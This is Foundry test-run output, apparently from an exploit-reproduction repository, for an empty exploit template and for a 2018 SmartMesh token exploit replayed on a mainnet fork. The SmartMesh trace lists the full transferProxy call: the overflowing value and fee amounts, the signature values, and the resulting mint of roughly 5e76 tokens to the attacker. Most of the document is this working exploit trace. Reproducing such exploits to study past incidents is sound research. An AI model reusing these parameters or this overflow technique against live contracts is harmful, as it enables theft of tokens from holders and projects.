Compiling 22 files with Solc 0.8.28
Solc 0.8.28 finished in 990.71ms
Compiler run successful!

Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 23756)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [7939] ExploitScript::setUp()
    ├─ [0] VM::createSelectFork("mainnet", 1234567 [1.234e6])
    │   └─ ← [Return] 0
    └─ ← [Stop]

  [23756] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return]
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 509.35ms (4.12ms CPU time)

Ran 1 test for src/test/2018-04/SmartMesh_exp.sol:SmartMesh
[PASS] testExploit() (gas: 129082)
Logs:
  Attacker SMT Balance Before exploit: 0.000000000000000000
  Attacker SMT Balance After exploit: 50659039041325835497812305941300959685805618291217746767262.693003461994217473

Traces:
  [10740] SmartMesh::setUp()
    ├─ [0] VM::createSelectFork("mainnet", 5499034 [5.499e6])
    │   └─ ← [Return] 0
    └─ ← [Stop]

  [129082] SmartMesh::testExploit()
    ├─ [3462] 0x55F93985431Fc9304077687a35A1BA103dC1e081::symbol() [staticcall]
    │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000003534d540000000000000000000000000000000000000000000000000000000000
    ├─ [2649] 0x55F93985431Fc9304077687a35A1BA103dC1e081::balanceOf(SmartMesh: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [2444] 0x55F93985431Fc9304077687a35A1BA103dC1e081::decimals() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000012
    ├─ emit log_named_decimal_uint(key: "Attacker SMT Balance Before exploit", val: 0, decimals: 18)
    ├─ [81362] 0x55F93985431Fc9304077687a35A1BA103dC1e081::transferProxy(0xDF31A499A5A8358b74564f1e2214B31bB34Eb46F, 0xDF31A499A5A8358b74564f1e2214B31bB34Eb46F, 65133050195990359925758679067386948167464366374422817272194891004451135422463 [6.513e76], 50659039041325835497812305941300959685805618291217746767262693003461994217473 [5.065e76], 27, 0x87790587c256045860b8fe624e5807a658424fad18c2348460e40ecf10fc8799, 0x6c879b1e8a0a62f23b47aa57a3369d416dd783966bd1dda0394c04163a98d8d8)
    │   ├─ [3000] PRECOMPILES::ecrecover(0xd6d57172b96a1ef19ed7b27c42583206f29c9c5f14ca9145738856cbe514e51a, 27, 61276061222369650866624912002229797457106560001799691573297349435870532110233, 49089382594757373392813692786525107866179093487605773010201389562896471087320)
    │   │   └─ ← [Return] 0x000000000000000000000000df31a499a5a8358b74564f1e2214b31bb34eb46f
    │   ├─ emit Transfer(param0: 0xDF31A499A5A8358b74564f1e2214B31bB34Eb46F, param1: 0xDF31A499A5A8358b74564f1e2214B31bB34Eb46F, param2: 65133050195990359925758679067386948167464366374422817272194891004451135422463 [6.513e76])
    │   ├─ emit Transfer(param0: 0xDF31A499A5A8358b74564f1e2214B31bB34Eb46F, param1: SmartMesh: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 50659039041325835497812305941300959685805618291217746767262693003461994217473 [5.065e76])
    │   ├─  storage changes:
    │   │   @ 0x3789435f4a55bbac3675e7d4b2ad00e0a8ea6616b1531ed26dcd1b5c30d386d1: 0 → 0x8fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
    │   │   @ 0xcbca2c2e1a1577eb2e25b9dce980a2cead88d4a5422449a454760a1d38d5b82a: 0 → 0x7000000000000000000000000000000000000000000000000000000000000001
    │   │   @ 0x444d6cc666eab17b17077b9abdee40de4b60c35f4397cf3fa5a0f9eba844bd93: 0 → 1
    │   └─ ← [Return] true
    ├─ [1462] 0x55F93985431Fc9304077687a35A1BA103dC1e081::symbol() [staticcall]
    │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000003534d540000000000000000000000000000000000000000000000000000000000
    ├─ [649] 0x55F93985431Fc9304077687a35A1BA103dC1e081::balanceOf(SmartMesh: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0x7000000000000000000000000000000000000000000000000000000000000001
    ├─ [444] 0x55F93985431Fc9304077687a35A1BA103dC1e081::decimals() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000012
    ├─ emit log_named_decimal_uint(key: "Attacker SMT Balance After exploit", val: 50659039041325835497812305941300959685805618291217746767262693003461994217473 [5.065e76], decimals: 18)
    ├─  storage changes:
    │   @ 0x444d6cc666eab17b17077b9abdee40de4b60c35f4397cf3fa5a0f9eba844bd93: 0 → 1
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.57s (2.33s CPU time)

Ran 2 test suites in 3.58s (4.08s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
